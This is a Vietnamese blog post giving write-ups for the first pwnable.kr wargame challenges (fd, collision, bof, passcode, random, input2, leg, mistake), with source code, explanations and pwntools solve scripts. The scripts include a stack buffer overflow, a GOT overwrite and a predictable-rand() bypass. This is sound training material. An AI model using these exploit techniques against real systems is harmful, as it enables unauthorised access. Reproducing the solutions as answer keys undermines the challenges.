---
title: PWNABLE.KR - Phần 1
tag: ['PWN', 'Writeup']
date: 2026-02-02 21:41:01
cover: /img/post/writeup/pwnable-kr/thumbnail.png
category: ['Writeup']
author:
    - Vuk3r
---
Đây là series try hard giải các challenge trên trang web [pwnable.kr](http://pwnable.kr). Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :>

# fd

## Description

```c
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

## Solution

Khi gọi hàm read, chương trình truyền vào tham số đầu tiên là `fd` với `fd` được tính theo công thức  `atoi( argv[1] ) - 0x1234` và argv[1] có nghĩa là tham số đầu tiên khi bạn gọi file ( ví dụ như `./fd 123`)

Và nếu như `read` thực thi thành công thì sẽ yêu cầu bạn nhập input và lưu vào biến `buf`, sau đó đem đi so sánh với chuỗi   `LETMEWIN\n` là đọc được flag.

tìm hiểu `fd` thì mình biết được rằng đó là chỉ số `file description`, với đầu vào là input từ bàn phím thì ta cần nó là `fd` của `STDIN` tương đương với `0`, `argv[1]` sẽ được `atoi()` chuyển về số nguyên và đem trừ với `0x1234` thì ta chỉ cần gọi file với tham số đầu là `4660` là được.

## Payload

```c
from pwn import *
import sys

### USING : python3 solve.py fd

p = ssh(
    user=sys.argv[1],
    host='pwnable.kr',
    port=2222,
    password='guest',
)
sh = p.shell()

fd_minus = 0x1234
sh.sendline(f'./fd {fd_minus}')
sh.send('LETMEWIN\n')

sh.interactive()  
```

# Collision

## Description

```c
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){ 
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

## Solution

Bài này yêu cầu đầu vào dài 20 byte. Sau đó làm gì đó với input của mình rồi mới đem so với biến `hashcode`. Hàm `check_password()` nhận vào 1 chuỗi dài 20 byte, sau đó gọi 1 con trỏ int để trỏ tới 4 kí tự 1 lần. 

Ví dụ mình nhập `aaaabbbbccccddddeeee` thì con trỏ đầu tiên sẽ trỏ tới địa chỉ mang giá trị `0x4141414141` rồi cộng số đó vào biến `res`. Nôm na thì là chuỗi dài 20 kí tự, lấy hex của 4 kí tự đầu ra, cộng vào `res`, tới 4 kí  tự tiếp theo và làm hành động đó tổng là 5 lần. Vậy thì ta chỉ cần lấy biến `hashcode` chia ra làm 4 phần bằng nhau và cộng với phần còn lại, ghép 5 phần thành 1 chuỗi thì ta sẽ thu được 1 chuỗi khi đi qua hàm `check_password()` sẽ trả về giá trị bằng với `hashcode`. Mình không chia cho 5 vì khi lấy chuỗi `0x21DD09EC/5`thì mình thấy dư nên sẽ chia 4, vừa tròn đẹp :>

## Payload

Để cho tiện thì mình in chuỗi đó ra rồi thêm trực tiếp vào chương trình bằng thủ công :

```c
hashcode = 0x21DD09EC
chunk = int(hashcode/5)
final_chunk = hashcode-chunk*4
payload = p32(chunk)*4 + p32(final_chunk)
print(repr(payload))

# output : b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
# usage  : ./col $'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

# Bof

## Description

```c
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

ssh bof@pwnable.kr -p2222 (pw: guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Solution

Với biến `overflowme` được khai báo là 32 byte nhưng gọi tới hàm `gets()` - một hàm nhập không có điểm dừng :v Nên chỉ cần mình khi tràn xuống biến `key` ở dưới là được. Chương trình được cho là `x86` có nghĩa là tham số `key` sẽ nằm trên stack khi được khai báo và địa chỉ sẽ nằm cao hơn địa chỉ của biến local của hàm `func` ⇒ Biến `overflowme` có thể thay đổi giá trị của biến `key` khi ghi tràn.

## Payload

```c
from pwn import *
import sys

### USING : python3 solve.py bof

p = ssh(
    user=sys.argv[1],
    host='pwnable.kr',
    port=2222,
    password='guest',
)
sh = p.shell()

sh.sendline(b'nc 0 9000')

payload = b'a'*52
payload += p32(0xcafebabe)
sh.sendline(payload)

#cat flag

sh.interactive()
```

# Passcode

## Description

```c
Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

### Checksec

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

## Solution

Chạy chương trình và nhập vào biến thứ 2 thì gặp lỗi Segment fault nên phân tích code thì rõ là đoạn code đã code sai đoạn input `passcode1` và `passcode2` là thay vì truyền vào địa chỉ của 2 biến thì lại truyền vào giá trị, có nghĩa là khi chạy thì nó sẽ lấy giá trị nào nó trên thanh stack để nhập vào. Điều hay là chương trình vô tình nhập được vào `passcode1` (author setup :v). Việc nhập vào được vẫn là khả thi nếu như giá trị được trỏ tới là một địa chỉ hợp lệ (một địa chỉ đang tồn tại trong chương trình và có quyền ghi). Và khi debug sẽ thấy `passcode1` được nhận 1 địa chỉ hợp lệ, `passcode2` nhận một địa chỉ rác (nó là `canary` nhưng ta không cần quan tâm, sự xuất hiện của nó giúp mình nhìn thấy được các giá trị khác). Và khi debug hàm `welcome` sẽ thấy 2 giá trị này cũng tồn tại trên stack khi chương tình bảo nhập tên. Thực tế thì 2 giá trị đó đều là giá trị của thanh stack cũ. 

Nhập  95 kí tự vào name và kiểm tra trạng  thái stack sẽ thấy được 1 địa chỉ hợp lệ và 1 giá trị hợp lệ khi gọi hàm `welcome` và nhập tên (ảnh 1)

![image.png](/img/post/writeup/pwnable-kr/series-1/1.png)

                         Trạng thái stack của hàm welcome khi nhập 95 kí tự

Khi đó debug cũng sẽ thấy các giá trị này được gọi tới như tham số thứ 2 của hàm `scanf` 


![image.png](/img/post/writeup/pwnable-kr/series-1/2.png)

                        Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode1

![image.png](/img/post/writeup/pwnable-kr/series-1/3.png)

                        Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode2

Nhập tên dài hơn 4 kí tự sẽ khi đè địa chỉ đó, vậy có nghĩa là ta có thể điều khiển địa chỉ nhập vào của `passcode1`. Vì không có bảo vệ RELRO và địa chỉ PIE tĩnh nên ta sẽ tấn công địa chỉ GOT của 1 hàm nào sau đó khi nhập xong passcode1. Mình chọn hàm  `fflush` là mục tiêu vì là chọn hàm gần nhất thì giảm rủi ro chương trình bị lỗi.

### Solution

```c
from pwn import *
import sys

# usage: python3 solve.py passcode

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

fflush_got = 0x0804c030
login_168 = 0x0804929e #win
name = b'a'*96 + p32(fflush_got)

p.sendline(name)
p.sendline(str(login_168))
p.interactive()
```

Đây là chương trình khai thác local và đã thành công. Riêng trên remote thì mình tà đạo 1 chút (vì nó lỗi hoài T~T ) 

```c
python -c 'import sys; sys.stdout.buffer.write(b"\x41"*96 + b"\x14\xc0\x04\x08" + b"134517391")' | ./passcode

```

# Random

## Description

```c
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned int random;
	random = rand(); // random value!

	unsigned int key = 0;
	scanf("%d", &key);

	if ((key ^ random) == 0xcafebabe)
	{
		printf("Good!\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

```

## Solution

Với `rand()` mà không có seed truyền vào thì nó không thực sự random mà mình có thể biết được đầu ra bằng cách chạy 1 đoạn code với hàm `rand()` thì sẽ thu được giá trị giống như chương trình. Vậy thì chỉ cần viết lại 1 chương trình khác in ra hàm `rand()` 1 lần và lấy giá trị đó xor với `0xcafebabe` là sẽ thu được kết quả.

## Payload

```c
from pwn import *
import sys

p = ssh(
    user=sys.argv[1],
    host='pwnable.kr',
    port=2222,
    password='guest',
)
sh = p.shell()
sh.recvuntil(f'{sys.argv[1]}@ubuntu:~$')

first_time = 1804289383
key = f'{first_time^0xcafebabe}'

sh.sendline('./random')
sh.sendline(key)

sh.interactive()
```

# Input2

## Description

```c
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	setregid(getegid(), getegid());
	system("/bin/cat flag");	
	return 0;
}

```

## Solution

Bài này hay ở chỗ nó dạy mình biết rằng các đầu vào của một chương trình có thể lấy như từ biến môi trường, file, stdin,… Cách giải thì chỉ cần research những đầu vào tương ứng như trong source là được. Ở đây mình cần dùng script để setup các tham số, các biến, và các pipline để bypass các stage.

Stage 1 : Argc là số lượng tham số bạn truyền vào, với tham số đầu tiên luôn là tên file. Tham số `argv` với `argv[’A’]` tương đương `argv[65]`. Được truyền vào như sau : `./file a b c`  với a b c là các tham số argv.

Stage 2 : với fd=0 sẽ là stdin và fd=2 là stderr, ở đây ta cần dùng script để tạo 1 luồng khác, gán stderr vào luồng đó và ghi vào đó giá trị tương ứng.

Stage 3 : Setup biến môi trường.

Stage 4 : Setup file. Bạn có thể tạo và file bằng python hoặc bằng bash script. 

Stage 5 : Là stage dùng socket để gửi nhận giá trị, chỉ cần dùng pwntool để mở 1 luồng remote tới chương trình là ok. 

## Payload

```c
from pwn import *
context.log_level = 'DEBUG'

######### STAGE 1 #########
argv = ['/home/input2/input2'] + ['a']*99
argv[ord('A')] = ''
argv[ord('B')] = '\x20\x0a\x0d'

argv[ord('C')] = '4445' # for stage 5

######### STAGE 2 #########
r1,w1 = os.pipe() # tạo 1 pipe, câu lệnh trả về 2 biến read và write
r2,w2 = os.pipe()

os.write(w1,b'\x00\x0a\x00\xff')
os.write(w2,b'\x00\x0a\x02\xff')
# cách 2 đó là dùng PTY

######### STAGE 3 #########
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}

######### STAGE 4 #########
with open('\x0a', 'wb') as f:
    # Ghi dữ liệu vào tệp
    f.write(b'\x00\x00\x00\x00')
# một cách khác đó là tạo 1 file bằng bash : touch $'\x0a' và dùng công cụ như HxD thêm 4 byte \x00 vào file là được

p = process(argv,stdin=r1,stderr=r2, env=env)

######### STAGE 5 #########
conn = remote('localhost',4445)
conn.sendline(b'\xde\xad\xbe\xef')

p.interactive()
```

# Leg

## Description

```c
Daddy told me I should study ARM architecture.
But I know Intel architecture and it should be similar.
Why bother to study ARM?

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```

## Source

### leg.c

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

int key1()
{
    asm("mov r3, pc\n");
}
int key2()
{
    asm(
        "push	{r6}\n"
        "add	r6, pc, $1\n"
        "bx	r6\n"
        ".code   16\n"
        "mov	r3, pc\n"
        "add	r3, $0x4\n"
        "push	{r3}\n"
        "pop	{pc}\n"
        ".code	32\n"
        "pop	{r6}\n");
}
int key3()
{
    asm("mov r3, lr\n");
}
int main()
{
    int key = 0;
    printf("Daddy has very strong arm! : ");
    scanf("%d", &key);
    if ((key1() + key2() + key3()) == key)
    {
        printf("Congratz!\n");
        int fd = open("flag", O_RDONLY);
        char buf[100];
        int r = read(fd, buf, 100);
        write(0, buf, r);
    }
    else
    {
        printf("I have strong leg :P\n");
    }
    return 0;
}

```

### leg.asm

```c
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb) 

```

## Solution

Chương trình gốc hiểu đơn giản là lấy 3 giá trị của 3 hàm `key` tính toán rồi so với input của mình. Mục tiêu là tính 3 giá trị đó. Không nhận được binary mà là 1 file asm và với địa chỉ như thế mình nghĩ chương trình là địa chỉ tĩnh. Nên mọi thứ có thể tính được dựa vào file asm. 

Với các hàm `key` thì mình thấy nó không được gọi lệnh trả về nhưng vẫn thu được giá trị. Mình nôm na nghĩ tới việc giá trị sẽ được gán vào thanh ghi nào đó tương tự như `EAX` → File asm sẽ có ích cho việc này. Thì qua tìm hiểu mình biết được rằng giá trị trả về sẽ được gán vào thanh ghi `r0`, vậy thì với mỗi hàm key mình sẽ follow giá trị `r0` là được. 

`key1()` : `pc` là thanh ghi trỏ tới địa chỉ của câu lệnh hiện tại + 8, khi chạy tới địa chỉ `0x00008cdc` thì thanh ghi `pc= 0x00008cdc+8 = 0x8ce4` rồi gán cho `r3` và rồi gán cho `r0` 

`→ r0 = 0x8ce4` 

```c
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
```

`key2()` : với 2 dòng đầu tiên có chức năng đổi mode hiện tại là ARM sang THUMB, thì `pc` sẽ bước ngắn hơn, giá trị pc sẽ là +4 thay vì +8. Thêm lệnh adds là +4 cho r3 trước khi gán cho r0

`→ pc = 0x00008d04+4 = 0x8d08 , r3 = 0x8d08+4 = 0x8d0c, r0 = 0x8d0c`

```c
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
```

`key3()` : lr là thanh ghi trỏ tới địa chỉ trả về (giống như 1 thanh ghi mang giá trị RIP). Thì sau khi hàm `key3` thực thi xong, nó sẽ tiếp tục trỏ tới 1 lệnh nào đó trong main thì `lr` sẽ mang giá trị đó. 

`→ r0 = 0x00008d80`

```c
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
```

Tổng kết giá trị ta có : `0x8ce4 + 0x8d0c + 0x00008d80 = 0x1a770`

# Mistake

## Description

```c
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)
This task is based on real event

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}

```

## Solution

Lỗi là ở đây : 
`if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)`

Thứ tự thực thi đã bị sai khi nó gọi `open` xong thì tới phép so sánh `<` rồi mới tới gán giá trị cho `fd`.

thành ra khi mở thành công thì sẽ trả về giá trị file descriptor của file vừa mở, đem đi so sánh với 0, giả sử file descriptor ở đây là 3 thì 3 < 0 là sai → trả về 0 và gán 0 cho biến `fd`, biến câu lệnh sau thành lệnh đọc input từ stdin :

`if(!(len=read(fd,pw_buf,PW_LEN) > 0))`

Rồi thì với logic là `pw_buf` là biến do mình kiểm soát thay vì trong file password, đem so sánh với biến `pw_buf2` được qua phép xor của mình thì cả 2 giá trị đều do mình kiểm soát. Thế là xong

## Payload

ở đây mình chạy lại output của hàm xor với 1 chuỗi dài 10 kí tự bất kì để thu output. Khi đó chạy chương trình và nhập cả 2 giá trị vào thoi :> 

```c
#include <stdio.h>
#include <string.h>
#define XORKEY 1
void xor(char *s, int len)
{
    int i;
    for (i = 0; i < len; i++)
    {
        s[i] ^= XORKEY;
    }
}
int main()
{
    char d[] = "1234567890";
    char *c = d;
    xor(d, strlen(d));
    printf("%s", d); //0325476981

}
```

Ôk hết rồi, hẹn các bạn phần sau :> Phần sau mình sẽ clear toàn bộ Todder :>